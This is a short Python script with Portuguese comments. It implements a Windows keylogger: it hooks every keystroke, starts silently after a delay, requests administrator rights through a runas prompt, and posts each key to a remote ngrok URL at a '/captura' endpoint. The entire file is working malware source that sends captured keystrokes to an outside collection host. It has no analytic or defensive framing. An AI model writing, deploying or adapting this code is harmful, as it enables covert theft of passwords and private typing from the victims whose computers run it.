import pyWinhook as pyHook
import pythoncom
import requests
import threading
import ctypes
import sys
import time

# CONFIGURAÇÃO: Substitui pelo teu link do ngrok
URL_BASE = "https://zaria-stylographic-naovely.ngrok-free.dev"
URL = f"{URL_BASE}/captura"

def enviar_batch(conteudo):
    try:
        # Envia como JSON para o receptor
        requests.post(URL, json={"tecla": conteudo, "processo": "WIN_ALVO_PRO"}, timeout=5)
    except:
        pass

def ao_digitar(event):
    global buffer
    buffer = f" [{event.Key}] "
    # Envio imediato ou em batch
    threading.Thread(target=enviar_batch, args=(buffer,)).start()
    return True

# Início Silencioso
time.sleep(5)

# Solicitar Admin para o Hook funcionar
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

hm = pyHook.HookManager()
hm.KeyDown = ao_digitar
hm.HookKeyboard()
pythoncom.PumpMessages()
